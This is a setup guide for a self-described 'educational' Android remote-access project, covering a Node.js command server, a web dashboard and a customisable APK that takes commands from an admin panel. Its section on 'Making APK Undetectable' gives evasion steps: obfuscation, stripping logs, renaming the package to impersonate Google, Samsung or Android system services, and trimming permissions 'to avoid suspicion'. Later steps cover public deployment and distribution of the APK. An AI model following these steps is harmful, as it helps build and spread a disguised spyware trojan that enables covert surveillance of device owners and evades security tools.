# 🚀 COMPLETE SETUP GUIDE - Step by Step

## 📋 Table of Contents
1. [Prerequisites](#prerequisites)
2. [Backend Setup](#backend-setup)
3. [Frontend Setup](#frontend-setup)
4. [Android APK Customization](#android-apk-customization)
5. [Building APK](#building-apk)
6. [Deployment](#deployment)
7. [Testing](#testing)
8. [Troubleshooting](#troubleshooting)

---

## 1️⃣ Prerequisites

### **Required Software:**

#### **For Backend & Frontend:**
```bash
# Node.js (v16 or higher)
https://nodejs.org/

# MongoDB (v4.4 or higher)
https://www.mongodb.com/try/download/community

# Git
https://git-scm.com/downloads

# Code Editor (VS Code recommended)
https://code.visualstudio.com/
```

#### **For Android APK:**
```bash
# Android Studio (latest version)
https://developer.android.com/studio

# JDK 11 or higher
https://www.oracle.com/java/technologies/downloads/

# Gradle (comes with Android Studio)
```

---

## 2️⃣ Backend Setup (Node.js Server)

### **Step 1: Clone Repository**
```bash
git clone https://github.com/kishan7878/RemoteAccess-Educational.git
cd RemoteAccess-Educational
```

### **Step 2: Install MongoDB**

**Windows:**
```bash
# Download from: https://www.mongodb.com/try/download/community
# Install and start MongoDB service
net start MongoDB
```

**Linux/Mac:**
```bash
# Ubuntu/Debian
sudo apt-get install mongodb

# Mac
brew install mongodb-community
brew services start mongodb-community
```

### **Step 3: Setup Backend**
```bash
cd backend
npm install
```

### **Step 4: Configure Environment**
```bash
# Create .env file
cp .env.example .env

# Edit .env file
nano .env
```

**Edit `.env` file:**
```env
# Server Configuration
PORT=5000
NODE_ENV=development

# MongoDB Configuration
MONGODB_URI=mongodb://localhost:27017/remoteaccess

# JWT Secret (CHANGE THIS!)
JWT_SECRET=your-super-secret-key-change-this-12345

# Server URL (for production, use your domain)
SERVER_URL=http://localhost:5000

# CORS Origins
CORS_ORIGIN=http://localhost:3000

# Socket.io Configuration
SOCKET_PATH=/socket.io
```

### **Step 5: Start Backend**
```bash
# Development mode
npm run dev

# Production mode
npm start
```

**Backend should be running on:** `http://localhost:5000`

---

## 3️⃣ Frontend Setup (Web Dashboard)

### **Step 1: Navigate to Frontend**
```bash
cd ../frontend
```

### **Step 2: Configure API URL**

**Edit `frontend/js/config.js`:**
```javascript
const CONFIG = {
    API_URL: 'http://localhost:5000',  // Change for production
    SOCKET_URL: 'http://localhost:5000'
};
```

### **Step 3: Start Frontend**

**Option A: Using Python (Simple)**
```bash
python3 -m http.server 3000
```

**Option B: Using Node.js http-server**
```bash
npm install -g http-server
http-server -p 3000
```

**Option C: Using VS Code Live Server**
- Install "Live Server" extension
- Right-click `index.html`
- Select "Open with Live Server"

**Frontend should be running on:** `http://localhost:3000`

---

## 4️⃣ Android APK Customization

### **Step 1: Open Android Studio**
```bash
# Open Android Studio
# File > Open > Select 'android' folder
```

### **Step 2: Customize App Details**

#### **A. Change App Name**

**File:** `android/app/src/main/res/values/strings.xml`
```xml
<resources>
    <string name="app_name">YourAppName</string>  <!-- CHANGE THIS -->
</resources>
```

#### **B. Change Package Name**

**File:** `android/app/build.gradle`
```gradle
android {
    defaultConfig {
        applicationId "com.yourcompany.yourapp"  // CHANGE THIS
        minSdkVersion 24
        targetSdkVersion 33
        versionCode 1
        versionName "1.0"
    }
}
```

**Then refactor package:**
1. Right-click package in Android Studio
2. Refactor > Rename
3. Update all imports

#### **C. Change App Icon**

**Replace icons in:**
```
android/app/src/main/res/
├── mipmap-hdpi/ic_launcher.png
├── mipmap-mdpi/ic_launcher.png
├── mipmap-xhdpi/ic_launcher.png
├── mipmap-xxhdpi/ic_launcher.png
└── mipmap-xxxhdpi/ic_launcher.png
```

**Use online tool:** https://romannurik.github.io/AndroidAssetStudio/

#### **D. Configure Server URL**

**File:** `android/app/src/main/java/.../utils/Constants.java`
```java
public class Constants {
    // CHANGE THIS to your server URL
    public static final String SERVER_URL = "http://YOUR_SERVER_IP:5000";
    
    // For production (with domain)
    // public static final String SERVER_URL = "https://yourdomain.com";
}
```

#### **E. Customize Consent Screen**

**File:** `android/app/src/main/res/values/strings.xml`
```xml
<string name="consent_title">Your Custom Title</string>
<string name="terms_content">
    Your custom terms and conditions here...
    
    ⚠️ EDUCATIONAL PURPOSE ONLY
    • Custom feature 1
    • Custom feature 2
    ...
</string>
```

---

## 5️⃣ Building APK

### **Method 1: Using Android Studio (Recommended)**

#### **Step 1: Build Debug APK**
```
Build > Build Bundle(s) / APK(s) > Build APK(s)
```

**Output:** `android/app/build/outputs/apk/debug/app-debug.apk`

#### **Step 2: Build Release APK (Signed)**

**A. Generate Keystore:**
```bash
cd android/app
keytool -genkey -v -keystore my-release-key.keystore -alias my-key-alias -keyalg RSA -keysize 2048 -validity 10000
```

**Enter details:**
- Password: (choose strong password)
- Name, Organization, etc.

**B. Configure Signing:**

**File:** `android/app/build.gradle`
```gradle
android {
    signingConfigs {
        release {
            storeFile file('my-release-key.keystore')
            storePassword 'your-password'
            keyAlias 'my-key-alias'
            keyPassword 'your-password'
        }
    }
    
    buildTypes {
        release {
            signingConfig signingConfigs.release
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
}
```

**C. Build Release APK:**
```
Build > Generate Signed Bundle / APK > APK
Select keystore > Enter passwords > Build
```

**Output:** `android/app/build/outputs/apk/release/app-release.apk`

### **Method 2: Using Command Line**

```bash
cd android

# Debug APK
./gradlew assembleDebug

# Release APK (after configuring signing)
./gradlew assembleRelease
```

---

## 6️⃣ Making APK Undetectable

### **A. Obfuscation (ProGuard)**

**File:** `android/app/proguard-rules.pro`
```proguard
# Keep application classes
-keep class com.yourcompany.yourapp.** { *; }

# Obfuscate everything else
-repackageclasses ''
-allowaccessmodification

# Keep Socket.io
-keep class io.socket.** { *; }

# Remove logging
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
}

# Optimize
-optimizationpasses 5
-dontusemixedcaseclassnames
-dontskipnonpubliclibraryclasses
-verbose
```

**Enable in build.gradle:**
```gradle
buildTypes {
    release {
        minifyEnabled true
        shrinkResources true
        proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
    }
}
```

### **B. Change Package Structure**

Rename package to something generic:
```
com.android.system.service
com.google.android.update
com.samsung.android.app
```

### **C. Remove Debug Info**

**File:** `android/app/build.gradle`
```gradle
android {
    buildTypes {
        release {
            debuggable false
            jniDebuggable false
        }
    }
}
```

### **D. Customize Permissions**

Only request needed permissions to avoid suspicion.

**File:** `android/app/src/main/AndroidManifest.xml`
```xml
<!-- Only add permissions you actually use -->
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<!-- Add others as needed -->
```

---

## 7️⃣ Deployment

### **A. Deploy Backend (Production)**

#### **Option 1: Heroku**
```bash
# Install Heroku CLI
# Login
heroku login

# Create app
heroku create your-app-name

# Add MongoDB addon
heroku addons:create mongolab

# Deploy
git push heroku main

# Set environment variables
heroku config:set JWT_SECRET=your-secret
```

#### **Option 2: VPS (DigitalOcean, AWS, etc.)**
```bash
# SSH to server
ssh root@your-server-ip

# Install Node.js & MongoDB
curl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash -
sudo apt-get install -y nodejs mongodb

# Clone repo
git clone https://github.com/kishan7878/RemoteAccess-Educational.git
cd RemoteAccess-Educational/backend

# Install dependencies
npm install

# Setup PM2 (process manager)
npm install -g pm2
pm2 start server.js
pm2 startup
pm2 save

# Setup Nginx (reverse proxy)
sudo apt-get install nginx
# Configure nginx to proxy to Node.js
```

**Nginx config:**
```nginx
server {
    listen 80;
    server_name yourdomain.com;

    location / {
        proxy_pass http://localhost:5000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
```

### **B. Deploy Frontend**

Upload `frontend` folder to:
- GitHub Pages
- Netlify
- Vercel
- Your VPS

### **C. Update Android APK**

After deploying backend, update server URL in Android app:
```java
public static final String SERVER_URL = "https://yourdomain.com";
```

Rebuild APK and distribute.

---

## 8️⃣ Testing

### **Step 1: Test Backend**
```bash
# Check if server is running
curl http://localhost:5000/api/health

# Should return: {"status":"ok"}
```

### **Step 2: Test Frontend**
- Open `http://localhost:3000`
- Register new account
- Login
- Check dashboard

### **Step 3: Test Android APK**
- Install APK on Android device
- Accept consent
- Grant permissions
- Check if device appears in dashboard
- Test commands

### **Step 4: Test Features**
```javascript
// In admin panel console
socket.emit('admin:command', {
    deviceId: 'your-device-id',
    command: 'ping',
    params: {}
});

// Test other commands
socket.emit('admin:command', {
    deviceId: 'your-device-id',
    command: 'get_device_info',
    params: {}
});
```

---

## 9️⃣ Troubleshooting

### **Backend Issues:**

**MongoDB not connecting:**
```bash
# Check if MongoDB is running
sudo systemctl status mongodb

# Start MongoDB
sudo systemctl start mongodb
```

**Port already in use:**
```bash
# Find process using port 5000
lsof -i :5000

# Kill process
kill -9 <PID>
```

### **Android Issues:**

**APK not installing:**
- Enable "Unknown Sources" in Android settings
- Check minimum SDK version (24+)

**App crashes:**
- Check Logcat in Android Studio
- Verify server URL is correct
- Check permissions

**Socket not connecting:**
- Verify server is running
- Check firewall settings
- Use correct IP (not localhost on real device)

### **Build Issues:**

**Gradle build fails:**
```bash
# Clean and rebuild
./gradlew clean
./gradlew build
```

**Dependencies not resolving:**
```bash
# Clear Gradle cache
rm -rf ~/.gradle/caches/
./gradlew build --refresh-dependencies
```

---

## 🎯 Quick Reference

### **Start Everything:**
```bash
# Terminal 1: MongoDB
mongod

# Terminal 2: Backend
cd backend && npm run dev

# Terminal 3: Frontend
cd frontend && python3 -m http.server 3000

# Terminal 4: Android (if developing)
cd android && ./gradlew installDebug
```

### **URLs:**
- Backend API: `http://localhost:5000`
- Frontend: `http://localhost:3000`
- MongoDB: `mongodb://localhost:27017`

### **Default Credentials:**
- Create account via frontend registration

---

## 📚 Next Steps

1. ✅ Customize app name, icon, package
2. ✅ Configure server URL
3. ✅ Build and test APK
4. ✅ Deploy backend to production
5. ✅ Update APK with production URL
6. ✅ Distribute APK

---

## ⚠️ Important Notes

- **Never commit `.env` file** to Git
- **Keep keystore file safe** - you can't update app without it
- **Use HTTPS in production** for security
- **Test thoroughly** before distribution
- **Follow legal guidelines** - educational use only

---

**Setup complete! Ab APK customize karo aur deploy karo!** 🚀
